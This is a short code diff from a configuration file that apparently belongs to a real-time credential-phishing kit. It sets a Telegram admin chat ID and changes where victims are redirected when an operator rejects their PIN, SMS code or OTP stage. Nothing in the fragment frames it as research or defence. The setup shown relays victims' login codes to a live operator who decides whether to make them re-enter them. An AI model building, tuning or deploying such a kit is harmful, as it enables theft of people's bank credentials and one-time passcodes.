@@ -25,7 +25,7 @@ TELEGRAM_ADMIN_CHAT_ID = "6558384338"
 # Redirect destinations when a stage is rejected in Telegram
 REJECT_REDIRECT_MAP = {
     "PIN_Rejected": "/login",
-    "SMS_Rejected": "/sms-verify",      # Adjust if your SMS page route differs
+    "SMS_Rejected": "/pending",
     "OTP_Rejected": "/final-verify",
 }
 
